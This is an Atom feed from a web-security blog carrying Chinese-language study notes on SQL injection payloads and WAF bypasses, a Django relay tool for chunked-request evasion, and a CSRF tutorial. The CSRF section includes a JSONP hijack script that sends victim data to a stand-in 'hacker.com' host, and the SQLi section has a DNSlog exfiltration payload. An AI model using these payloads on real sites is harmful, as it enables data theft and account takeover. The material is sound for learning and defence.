<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Yunen&#39;s Blog</title>
  
  <subtitle>Focus On Web Safety!</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.0x002.com/"/>
  <updated>2019-04-09T14:38:48.845Z</updated>
  <id>http://www.0x002.com/</id>
  
  <author>
    <name>Yunen</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SQL注入备忘录</title>
    <link href="http://www.0x002.com/2019/SQL%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    <id>http://www.0x002.com/2019/SQL注入备忘录/</id>
    <published>2019-04-04T17:01:00.000Z</published>
    <updated>2019-04-09T14:38:48.845Z</updated>
    
    <content type="html"><![CDATA[<h1 id="备忘录-一"><a href="#备忘录-一" class="headerlink" title="备忘录(一)"></a>备忘录(一)</h1><p>拿起小本本记下常考知识点。<br><a id="more"></a></p><h2 id="常用连接词"><a href="#常用连接词" class="headerlink" title="常用连接词"></a>常用连接词</h2><ul><li>and &amp;&amp; %23%23 且</li><li>or || %7c%7c 或</li><li>xor 非</li></ul><h2 id="Access-数据库："><a href="#Access-数据库：" class="headerlink" title="Access 数据库："></a>Access 数据库：</h2><p><strong>只能爆破表名、列名获取数据、无法用盲注等<br>数据主要存储在mdb、sap文件内</strong></p><h3 id="0x01-手工："><a href="#0x01-手工：" class="headerlink" title="0x01 手工："></a>0x01 手工：</h3><p>先判断字段数：<br><code>order by xx</code><br>在使用联合查询猜测表名列名：  </p><blockquote><p>前后两个子查询返回的结构必须相同，且数据类型必须相同，故常用NULL</p></blockquote><p>猜表：<code>union select 1,2,3,xx</code><br>猜列：<code>union select 1,2,password,4,5</code> (如果页面返回正常，则存在password列，猜表同理)<br>此方法<strong>兼容性</strong>不强。</p><h3 id="0x02-工具："><a href="#0x02-工具：" class="headerlink" title="0x02 工具："></a>0x02 工具：</h3><p>逐字猜解法：<br>一、<strong>查表：</strong><br><code>and exists (select * from 表名)</code>//这里的表名需要靠猜解，如果表名存在返回正常页面。<br>二、<strong>查列：</strong><br>将<code>*</code>换成列名可进行爆破列名，即：<code>and exists (select 列名 from 表名)</code><br>三、<strong>确定列名下的数据长度：</strong><br><code>and (select top 1 len(列名) from 表名)=5</code> //判断数据长度是否为5，若为5则返回正常<br>四、<strong>逐字猜解数据：</strong><br><code>and (select top 1 asc(mid(列名,位数,1)) from 表名)=97</code> //用mid函数取第x位字母，通过asc函数转化成ascii码进行判断比较，如果ascii为97，即字母a，页面返回正常</p><h2 id="mysql数据库："><a href="#mysql数据库：" class="headerlink" title="mysql数据库："></a>mysql数据库：</h2><h3 id="Version-lt-5-0"><a href="#Version-lt-5-0" class="headerlink" title="Version&lt;5.0:"></a>Version&lt;5.0:</h3><ul><li>爆破</li><li>盲注</li></ul><h3 id="version-gt-5-0"><a href="#version-gt-5-0" class="headerlink" title="version&gt;=5.0:"></a>version&gt;=5.0:</h3><p><strong>information_schema</strong>表下存储了Mysql数据库所有的数据库结果信息。  </p><ul><li>information_schema.schemeta //Mysql里所有的数据库库名</li><li>information_schema.tables //所有表名</li><li>information_schema.columns //所有列名</li></ul><p><strong>常用函数：</strong></p><ul><li>user() //查询数据库用户</li><li>version()  //查询版本</li><li>@@basedir()  //查询数据库路径</li><li>database() //查询当前数据库名</li><li>@@version_compile_os() //查询操作系统</li></ul><p><strong>用法例子：</strong><br><code>union select user(),2,3,version(),database(),xxx</code><br><em>可用null代替：</em><br><code>union select user(),null,null,version(),database(),xxx</code>  </p><p><strong>更多函数：</strong></p><ul><li>concat() //字符串相加</li><li>group_concat() //分组打印</li><li>length() //取字符串长度</li><li>substr(str,pos,len) //str字符串从pos位置开始取len个长度 substring()别名</li><li>mid(str,pos,len)  //str字符串从pos位置开始取len个长度</li><li>ascii(str)  //返回字符串str的首个字符的ASCII代码值</li><li>ord(str) //str或bool转为ascii</li><li>if(a,b,c) //a为条件，若a正确则返回b，相反返回c.</li></ul><p><strong>常用查询：</strong><br>查询全部数据库名：<br><code>select schema_name from information_schema.schemeta limit 0,10</code> //取前十个<br>查询指定表名：<br><code>select table_name from information_schema.tables where table_schema=&#39;sqli&#39;</code> //若单引号被过滤可用十六进制<br>查询指定列名：<br><code>select column_name from information_schema.columns where table_name=&#39;user&#39; and table_schema=&#39;sqli&#39;</code><br>获取指定数据:<br><code>select username,password from sqli.user</code> (垮库查询)  </p><h3 id="注释："><a href="#注释：" class="headerlink" title="注释："></a>注释：</h3><blockquote><p>#，<br>– X(X为任意字符)<br>/<em>(MySQL-5.1)<br>;%00<br><code>&#39;or 1=1;%00  &#39;or 1=1 union select 1,2</code>‘<br>‘or 1=1 #<br>‘/</em>!50000or<em>/ 1=1 – -      //版本号为5.1.38时只要小于50138<br>‘/</em>!or*/ 1=1 – -  </p></blockquote><p><strong>nd/or后面可以跟上偶数个!、~可以替代空格，也可以混合使用(混合后规律又不同)，and/or前的空格可以省略</strong></p><h2 id="宽字节注入："><a href="#宽字节注入：" class="headerlink" title="宽字节注入："></a>宽字节注入：</h2><p>一、常见：<br><strong>mysql数据库编码为gbk,且若’被转义成\’<br>使用<code>id=%df%27</code>，这里的<code>%27</code>会被变成<code>\%27</code>即<code>%5c%27</code>，再加上前边的<code>%df</code>变成<code>%df%5c%27</code>，而<code>%df%5c</code>在gbk字符集中表示汉子： 運，故语句便成<code>id=運&#39;</code>，成功逃逸出单引号转义(php中通常是addslashes函数，或开启GPC，PHP5.4版本已移除GPC)</strong><br>二、php函数utf8转gbk产生：<br><a href="https://xz.aliyun.com/t/1719" target="_blank" rel="noopener">https://xz.aliyun.com/t/1719</a></p><h2 id="报错注入："><a href="#报错注入：" class="headerlink" title="报错注入："></a>报错注入：</h2><h3 id="floor-和rand"><a href="#floor-和rand" class="headerlink" title="floor()和rand()"></a>floor()和rand()</h3><p><strong>虚拟表报错原理：</strong><br>payload:<br><code>union select count(*),2,concat(&#39;:&#39;,(select database()),&#39;:&#39;,floor(rand()*2))as a from information_schema.tables group by a</code><br><a href="https://www.2cto.com/article/201604/498394.html" target="_blank" rel="noopener">https://www.2cto.com/article/201604/498394.html</a></p><h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><p><strong>原理：</strong><br>extractvalue函数的第二个参数格式错误，会返回参数内容<br>payload:<br><code>and (extractvalue(1,concat(0x7e,(select user()),0x7e)))</code></p><h3 id="updatexml-同上具有32位长度限制"><a href="#updatexml-同上具有32位长度限制" class="headerlink" title="updatexml() 同上具有32位长度限制"></a>updatexml() 同上具有32位长度限制</h3><p>原理同上<br>payload:<br><code>and (updatexml(1,concat(0x7e,(select user()),0x7e),1))</code><br>// concat 在前后加上 ~ 使数据不符合参数格式从而报错</p><h3 id="GeometryCollection-等三重子查询报错"><a href="#GeometryCollection-等三重子查询报错" class="headerlink" title="GeometryCollection()等三重子查询报错"></a>GeometryCollection()等三重子查询报错</h3><blockquote><p>id = 1 AND GeometryCollection((select <em> from (select </em> from(select user())a)b))<br>polygon()<br>id =1 AND polygon((select <em> from(select </em> from(select user())a)b))<br>multipoint()<br>id = 1 AND multipoint((select <em> from(select </em> from(select user())a)b))<br>multilinestring()<br>id = 1 AND multilinestring((select <em> from(select </em> from(select user())a)b))<br>linestring()<br>id = 1 AND LINESTRING((select <em> from(select </em> from(select user())a)b))<br>multipolygon()<br>id =1 AND multipolygon((select <em> from(select </em> from(select user())a)b))</p></blockquote><h3 id="exp-Mysql5-5-5"><a href="#exp-Mysql5-5-5" class="headerlink" title="exp() Mysql5.5.5+"></a>exp() Mysql5.5.5+</h3><p><strong>原理：</strong><br>exp函数参数过大，转换时溢出报错<br>payload:<br><code>and exp(~(select * from(select user())a))</code><br><a href="https://drops.secquan.org/tips/8166" target="_blank" rel="noopener">https://drops.secquan.org/tips/8166</a></p><h3 id="以上类型均为子查询注入"><a href="#以上类型均为子查询注入" class="headerlink" title="以上类型均为子查询注入"></a>以上类型均为子查询注入</h3><h2 id="Mysql盲注："><a href="#Mysql盲注：" class="headerlink" title="Mysql盲注："></a>Mysql盲注：</h2><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><ul><li>布尔盲注</li><li>时间盲注</li></ul><p>布尔盲注：<br><code>and ascii(substr(select user(),1,1))&gt;64</code> 如果user()第一位字母Ascii大于64则页面返回正常<br>时间盲注：<br><code>and if(ascii(substr(select user(),1,1))&gt;64,sleep(2),1)</code> 如果user()第一位字母Ascii大于64则页面延迟两秒返回  </p><h3 id="BENCHMARK-count-expr"><a href="#BENCHMARK-count-expr" class="headerlink" title="BENCHMARK(count,expr)"></a>BENCHMARK(count,expr)</h3><p>此函数会执行expr函数count此，会造成明显时间延迟，可构造进行时间盲注</p><p>常见注入：</p><ul><li>数字型</li><li>字符串型<br>按照注入类型：<br>+SELECT型  //常用于获取信息，注入处常位于where 后，后可接注释字符保证查询的语法正确。<br>+INSERT型  //建立新的数据<br>+UPDATA型  //修改数据<br>+DELECT型  //删除数据</li></ul><p>MYSQL长度限制绕过<br>MYSQL对于用户输入的超长字符只会warning 而不是error<br>真实案例： WP注册admin(55个空格)x用户 修改管理员密码</p><h2 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h2><p><code>select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.xxxx.ceye.io\&#39;);</code><br><a href="https://www.cnblogs.com/afanti/p/8047530.html" target="_blank" rel="noopener">https://www.cnblogs.com/afanti/p/8047530.html</a><br><a href="https://wooyun.js.org/drops/%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E4%B8%AD%E4%BD%BF%E7%94%A8DNS%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E4%B8%AD%E4%BD%BF%E7%94%A8DNS%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE.html</a>  </p><h2 id="SQL注入防御："><a href="#SQL注入防御：" class="headerlink" title="SQL注入防御："></a>SQL注入防御：</h2><p>1.预编译sql<br>2.限制输入数据类型<br>3.过滤编码<br>4.白名单<br>5.管理数据库用户权限<br>6.按时维护，打好补丁</p><h2 id="SQL注入绕过："><a href="#SQL注入绕过：" class="headerlink" title="SQL注入绕过："></a>SQL注入绕过：</h2><p><strong>注入中常注意的编码：</strong></p><ul><li>%01-%0D特殊字符绕空格</li><li>&amp;= 在浏览器Url时要进行URL编码 %26 %3d</li><li>查询字符串中不允许有空格，可用%20,+对其编码</li><li>Cookie注入时，SQL语句中的分号得编码</li></ul><h3 id="单引号过滤"><a href="#单引号过滤" class="headerlink" title="单引号过滤"></a>单引号过滤</h3><p>若有单引号保护，且无编码二次注入即无漏洞。<br>若无单引号保护：<br>字符串可用十六进制表示：<code>0x123456</code>，也可用concat(char(65)+char(75)+xxx)</p><p>注：中间层会将这些编码转换成未编码值  </p><h3 id="逗号过滤"><a href="#逗号过滤" class="headerlink" title="逗号过滤"></a>逗号过滤</h3><p>if()可改写为 case when () then () else () end<br>substr()、mid()等可改写成substr((select user())from(1)for(1))  </p><h3 id="等号过滤"><a href="#等号过滤" class="headerlink" title="等号过滤"></a>等号过滤</h3><p>可用regexp、like、rlike、in等代替  </p><h3 id="判断注入点时的绕过："><a href="#判断注入点时的绕过：" class="headerlink" title="判断注入点时的绕过："></a>判断注入点时的绕过：</h3><ul><li>&amp;&amp; 1=1</li><li>&amp;&amp; 1=true</li><li>&amp;&amp; false</li><li>%23%23 true</li><li>%23%23 ‘0’=0</li><li>%23%23 ‘a’=’b’=’c’ //true</li><li>and~!!~if(‘a’=’b’=”c”,sleep(2),1)</li><li>a’&lt;2 返回正常 &lt;0 返回空值</li></ul><p>特定字符串被过滤时可用考虑全角字符</p><h3 id="绕过WAF"><a href="#绕过WAF" class="headerlink" title="绕过WAF"></a>绕过WAF</h3><blockquote><p>a) 大小写混合<br>b)替换关键字<br>c)使用编码<br>d)使用注释<br>e)等价函数与命令<br>f)使用特殊符号<br>g)HTTP参数控制<br>h)缓冲区溢出<br>i)整合绕过  </p></blockquote><h2 id="与系统直接交互："><a href="#与系统直接交互：" class="headerlink" title="与系统直接交互："></a>与系统直接交互：</h2><blockquote><p>load_file()读取文件<br>into out_file() 写文件<br>条件：FILE权限，管理员权限默认具有<br>INTO OUTFILE 与 INTO DOMPFILE的区别<br>后者适用于二进制文件，会将目标文件写入同一行内；前者适用于文本文件。<br>MYSQL UDF命令执行：<code>sqlmap: --os-cmd id -v 1</code><br>MSSQL：xp_cmdshell</p></blockquote><h2 id="其他："><a href="#其他：" class="headerlink" title="其他："></a>其他：</h2><h3 id="Boolean注入"><a href="#Boolean注入" class="headerlink" title="Boolean注入"></a>Boolean注入</h3><p>如果页面只返回Yes或No，则原sql查询返回的值可能是可bool值，如果过滤不严，可产生boolean注入，如：<br><code>and length(database())&gt;10</code> 如果次条件为真切前条件返回真，则页面返回正常。  </p><h3 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h3><p>注入存在于Cookie中</p><h3 id="XFF头注入"><a href="#XFF头注入" class="headerlink" title="XFF头注入"></a>XFF头注入</h3><p>注入存在于Header有中的X-Forward-For中，此函数常用于获取客户端真实IP。</p><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>PHP+Mysql不支持<br><img src="https://wooyun.js.org/images_result/images/2015081902360042624.jpg" alt=""></p><h3 id="连接符差异："><a href="#连接符差异：" class="headerlink" title="连接符差异："></a>连接符差异：</h3><p>Oracle: || 是连接符<br>MSSQL: +<br>MYSQL: [空格]  </p><h2 id="相关好文："><a href="#相关好文：" class="headerlink" title="相关好文："></a>相关好文：</h2><p><a href="https://p0sec.net/index.php/archives/117/" target="_blank" rel="noopener">SQL注入备忘手册(更新2017-12-11)</a><br><a href="https://www.cnblogs.com/afanti/p/8047530.html" target="_blank" rel="noopener">巧用DNSlog实现无回显注入</a><br><a href="https://wooyun.js.org/drops/MySQL%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7.html" target="_blank" rel="noopener">MySQL注入技巧</a><br><a href="https://wooyun.js.org/drops/Mysql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%28count%28%29%E3%80%81rand%28%29%E3%80%81group%20by%29.html" target="_blank" rel="noopener">Mysql报错注入原理分析(count()、rand()、group%20by)</a><br><a href="https://wooyun.js.org/drops/%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87waf%E5%92%8C%E8%BF%87%E6%BB%A4%E6%9C%BA%E5%88%B6.html" target="_blank" rel="noopener">深入了解SQL注入绕过waf和过滤机制</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;备忘录-一&quot;&gt;&lt;a href=&quot;#备忘录-一&quot; class=&quot;headerlink&quot; title=&quot;备忘录(一)&quot;&gt;&lt;/a&gt;备忘录(一)&lt;/h1&gt;&lt;p&gt;拿起小本本记下常考知识点。&lt;br&gt;
    
    </summary>
    
      <category term="原创栏目" scheme="http://www.0x002.com/categories/%E5%8E%9F%E5%88%9B%E6%A0%8F%E7%9B%AE/"/>
    
    
      <category term="SQL注入" scheme="http://www.0x002.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="备忘录" scheme="http://www.0x002.com/tags/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
      <category term="学习笔记" scheme="http://www.0x002.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入使用Django中继数据包bypassWAF</title>
    <link href="http://www.0x002.com/2019/SQL%E6%B3%A8%E5%85%A5%E4%BD%BF%E7%94%A8Django%E4%B8%AD%E7%BB%A7%E6%95%B0%E6%8D%AE%E5%8C%85bypassWAF/"/>
    <id>http://www.0x002.com/2019/SQL注入使用Django中继数据包bypassWAF/</id>
    <published>2019-03-30T08:00:00.000Z</published>
    <updated>2019-03-31T11:51:33.808Z</updated>
    
    <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>本人基于文章<strong>bypassword</strong>的文章<a href="https://www.freebuf.com/news/193659.html" target="_blank" rel="noopener">在HTTP协议层面绕过WAF</a>所编写一款工具。<br><a id="more"></a></p><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul><li>Python3.7.0</li><li>Django 2.1</li><li>Requests</li></ul><h1 id="使用范围"><a href="#使用范围" class="headerlink" title="使用范围"></a>使用范围</h1><ul><li>POST注入</li><li>可以分块传输的漏洞网站</li></ul><h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><p>修改图中圈中的部分，Evil_Url为存在注入的地址，Domain为其域名部分。<br><img src="https://i.loli.net/2019/03/30/5c9f3596b6415.png" alt=""></p><h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><p>靶机环境:<br>PHP5.4+Apache2.2+Mysql5+WAF:<br><img src="https://i.loli.net/2019/03/30/5c9f386c72c55.png" alt=""><br>首先部署Django：<br><img src="https://i.loli.net/2019/03/30/5c9f366a3f773.png" alt=""><br>其次将注入点换成部署的Url：<br>如：<code>http://192.168.32.144/2.php</code>存在POST注入，注入参数为<code>id</code>，部署的Url为<code>http://127.0.0.1:8000/</code><br>Sqlmap命令为<code>python sqlmap.py -u &quot;http://127.0.0.1:8000/&quot; --data &quot;id=1&quot;</code><br><img src="https://i.loli.net/2019/03/30/5c9f38de211e7.png" alt="">  </p><p>支持<code>-r xx.txt</code>需要修改请求头中的Host地址为Django部署的地址<br><img src="https://i.loli.net/2019/03/31/5c9fa0add9992.gif" alt=""></p><h1 id="下载地址："><a href="#下载地址：" class="headerlink" title="下载地址："></a>下载地址：</h1><p><a href="https://github.com/HackerYunen/Django-chunked-sqli" target="_blank" rel="noopener">https://github.com/HackerYunen/Django-chunked-sqli</a><br><strong>此项目我不断更新完善，欢迎Star、Issue</strong></p><h1 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h1><ul><li>暂无</li></ul><h1 id="解疑"><a href="#解疑" class="headerlink" title="解疑"></a>解疑</h1><h2 id="为什么使用Django？"><a href="#为什么使用Django？" class="headerlink" title="为什么使用Django？"></a>为什么使用Django？</h2><p>因为我只会Django</p><h2 id="为什么要中继？"><a href="#为什么要中继？" class="headerlink" title="为什么要中继？"></a>为什么要中继？</h2><p>因为sqlmap等软件无法发送chunked数据包(使用tamper也不行)</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h1&gt;&lt;p&gt;本人基于文章&lt;strong&gt;bypassword&lt;/strong&gt;的文章&lt;a href=&quot;https://www.freebuf.com/news/193659.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;在HTTP协议层面绕过WAF&lt;/a&gt;所编写一款工具。&lt;br&gt;
    
    </summary>
    
      <category term="原创栏目" scheme="http://www.0x002.com/categories/%E5%8E%9F%E5%88%9B%E6%A0%8F%E7%9B%AE/"/>
    
      <category term="神兵利器" scheme="http://www.0x002.com/categories/%E5%8E%9F%E5%88%9B%E6%A0%8F%E7%9B%AE/%E7%A5%9E%E5%85%B5%E5%88%A9%E5%99%A8/"/>
    
    
      <category term="Django" scheme="http://www.0x002.com/tags/Django/"/>
    
      <category term="SQL注入" scheme="http://www.0x002.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="Bypass" scheme="http://www.0x002.com/tags/Bypass/"/>
    
      <category term="WAF" scheme="http://www.0x002.com/tags/WAF/"/>
    
  </entry>
  
  <entry>
    <title>关于CSRF的那点事儿</title>
    <link href="http://www.0x002.com/2019/%E5%85%B3%E4%BA%8ECSRF%E7%9A%84%E9%82%A3%E7%82%B9%E4%BA%8B%E5%84%BF/"/>
    <id>http://www.0x002.com/2019/关于CSRF的那点事儿/</id>
    <published>2019-03-24T08:30:00.000Z</published>
    <updated>2019-03-29T00:43:56.457Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-CSRF简介"><a href="#0x01-CSRF简介" class="headerlink" title="0x01 CSRF简介"></a>0x01 CSRF简介</h2><p>&#160;&#160;&#160;&#160;CSRF，也称XSRF，即跨站请求伪造攻击，与XSS相似，但与XSS相比更难防范，是一种广泛存在于网站中的安全漏洞，经常与XSS一起配合攻击。<br><a id="more"></a></p><h2 id="0x02-CSRF原理"><a href="#0x02-CSRF原理" class="headerlink" title="0x02 CSRF原理"></a>0x02 CSRF原理</h2><p>&#160;&#160;&#160;&#160;攻击者通过盗用用户身份悄悄发送一个请求，或执行某些恶意操作。<br>&#160;&#160;&#160;&#160;CSRF漏洞产生的主要原因：</p><ul><li>请求所有的参数均可确定</li><li>请求的审核不严格，如：只验证了Cookie</li></ul><p>关于CSRF的执行过程，这里引用自<strong>hyddd</strong>大佬画的图：<br><img src="https://i.loli.net/2019/03/24/5c97436f3c14c.jpg" alt=""><br>&#160;&#160;&#160;&#160;我们知道，当我们使用img等标签时，通过设置标签的src等属性引入外部资源，是可以被浏览器认为是合法的跨域请求，也就是说是可以带上Cookie访问的。<br>&#160;&#160;&#160;&#160;试想一下，如果我们在a.com上放置一个img标签<code>&lt;img src=//b.com/del?id=1&gt;</code>。当b.com的用户在cookie没过期的情况下访问a.com，此时浏览器会向b.com发送一个指向<code>http://b.com/del?id=1</code>的<code>GET</code>请求，并且这个请求是带上Cookie的，而b.com的服务器仅仅是通过cookie进行权限判断，那么服务器就会进行相应的操作，比如假设此处为删除某个文章，用户在不知情的情况下便已完成操作。</p><h2 id="0x03-CSRF能够造成的危害"><a href="#0x03-CSRF能够造成的危害" class="headerlink" title="0x03 CSRF能够造成的危害"></a>0x03 CSRF能够造成的危害</h2><ul><li>篡改目标网站上的用户数据； </li><li>盗取用户隐私数据； </li><li>作为其他攻击向量的辅助攻击手法； </li><li>传播CSRF蠕虫。</li></ul><h2 id="0x04-CSRF的利用方式"><a href="#0x04-CSRF的利用方式" class="headerlink" title="0x04 CSRF的利用方式"></a>0x04 CSRF的利用方式</h2><ul><li>通过HTML标签发送合法的跨域请求</li><li>通过Ajax发送请求（由于CORS机制的存在，一般不使用）</li></ul><p>这里涉及到同源策略，如果不是很清楚可以先去了解一下。</p><h3 id="1-HTML标签"><a href="#1-HTML标签" class="headerlink" title="1) HTML标签"></a>1) HTML标签</h3><p>&#160;&#160;&#160;&#160;我们知道，根据同源策略的规定，跨域请求是不允许带上Cookie等信息的，可是出于种种考虑最终没有进行完全禁止，即存在某些合法的跨域请求。<br>&#160;&#160;&#160;&#160;通常由HTML标签<code>src</code>、<code>lowsrc</code>等属性产生的跨域请求是被浏览器认为是合法的跨域请求，并且此时并不需要<strong>javascript</strong>的参与。<br><img src="https://i.loli.net/2019/03/25/5c98de42ab890.png" alt=""><br>&#160;&#160;&#160;&#160;由HTML标签发出的合法跨域请求与正常的用户点击发出的请求相比所不同的是：两者请求头中的<strong>Referer</strong>值不同。<br>&#160;&#160;&#160;&#160;不过值得说明的是IE浏览器在面对这种情况时会判断<strong>本地Cookie</strong>是否带上<strong>P3P</strong>属性，如果仅仅是内存Cookie则不受此影响。<br>&#160;&#160;&#160;&#160;CSRF不仅仅只能针对GET请求，也可以针对POST请求，不过只能使用from标签进行自动提交，注意此处需用到<strong>javascript</strong>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://a.com/changepass&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;victim&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;hacker&quot;&gt;</span><br><span class="line">&lt;input id=&quot;sub&quot; type=&quot;submit&quot;&gt; //可用样式表将按钮隐藏</span><br><span class="line">&lt;/form&gt; </span><br><span class="line">&lt;script&gt;</span><br><span class="line">document.getElementById(&quot;sub&quot;).click()</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><h3 id="2-Ajax"><a href="#2-Ajax" class="headerlink" title="2) Ajax"></a>2) Ajax</h3><p>&#160;&#160;&#160;&#160;除了通过HTML标签发送跨域请求外，还可以通过Ajax来发送跨域情况，不过Ajax是严格遵守CORS规则的。<br>&#160;&#160;&#160;&#160;关于CORS规则，不清楚的可以去看看<strong>evoA</strong>大佬的一篇文章<a href="https://xz.aliyun.com/t/4470#toc-11" target="_blank" rel="noopener">跨域方式及其产生的安全问题</a>。<br>&#160;&#160;&#160;&#160;简单来说就是需要构造的xhr的<code>withCredentials</code>属性也为<code>true</code>才能带上Cookie进行跨域请求，与IE兼容性不好，且构造难度较Html复杂，故通常情况下我们不使用Ajax来进行CSRF攻击。<br>&#160;&#160;&#160;&#160;通常使用Ajax来跨域进行CSRF攻击的漏洞一般都配合XSS漏洞，此时的Ajax与目标域相同，不受CORS的限制。  </p><h2 id="0x05-CSRF利用实例"><a href="#0x05-CSRF利用实例" class="headerlink" title="0x05 CSRF利用实例"></a>0x05 CSRF利用实例</h2><h3 id="1-常用利用方式"><a href="#1-常用利用方式" class="headerlink" title="1) 常用利用方式"></a>1) 常用利用方式</h3><p>&#160;&#160;&#160;&#160;攻击者构造恶意html，通过引诱用户/管理员访问，触发CSRF漏洞。<br><img src="https://i.loli.net/2019/03/25/5c98c737b44f7.png" alt=""></p><h3 id="2-结合XSS利用"><a href="#2-结合XSS利用" class="headerlink" title="2) 结合XSS利用"></a>2) 结合XSS利用</h3><p>&#160;&#160;&#160;&#160;CSRF+XSS结合，产生的危害已几何倍数剧增。如果CSRF和XSS两个漏洞是在同一个域下的话，那么此时的CSRF已经变成了OSRF了，即本站点请求伪造(出自黑客攻防技术宝典Web实战篇第二版p366)，此时已经变成XSS的请求伪造攻击，本文不在赘述。  </p><h3 id="3-jsonp"><a href="#3-jsonp" class="headerlink" title="3) jsonp"></a>3) jsonp</h3><p>&#160;&#160;&#160;&#160;我们知道网站api返回的数据类型一般为json型或Array型，这里我们仅讨论json型。<br>&#160;&#160;&#160;&#160;当我们需要调用远程api时json返回的数据一般如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user(&#123;&quot;name&quot;:&quot;Yunen&quot;,&quot;work&quot;:&quot;Student&quot;,&quot;xxxx&quot;:&quot;xxxxxxxxx&quot;,......&#125;)</span><br></pre></td></tr></table></figure></p><p>&#160;&#160;&#160;&#160;这是因为开发者如果需要调用远程服务器的api获取json数据，由于同源策略的限制，通过ajax获取就会显得比较麻烦，相比之下<code>&lt;script&gt;</code>标签的开放策略，无疑是最好的方法去弥补这一缺陷，使得json数据可以进行方便的跨域传输。此处的user为回调函数名，一般为某个请求参数值(比如：<strong>callback</strong>)，就上述例子说，只需要通过下面方法即可调用返回的数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    function user(data)&#123;</span><br><span class="line">        console.log(data);//此时的json数据已经存储进了data变量中    </span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/03/25/5c98cf9a343b8.png" alt=""><br><img src="https://i.loli.net/2019/03/25/5c98d67b2238c.png" alt=""><br>&#160;&#160;&#160;&#160;这种远程api接口十分容易受到CSRF攻击，我们可以通过修改<strong>callback</strong>参数值并添加自定义函数，如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    function jsonphack(data)&#123;</span><br><span class="line">        new image().src=&quot;http://hacker.com/json.php?data=&quot;+escape(data);</span><br><span class="line">        //将json返回的数据发送到黑客服务器上</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;http://127.0.0.1/1.php?callback=jsonphack&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><h3 id="4-更多例子"><a href="#4-更多例子" class="headerlink" title="4) 更多例子"></a>4) 更多例子</h3><p><a href="https://www.freebuf.com/articles/web/55965.html" target="_blank" 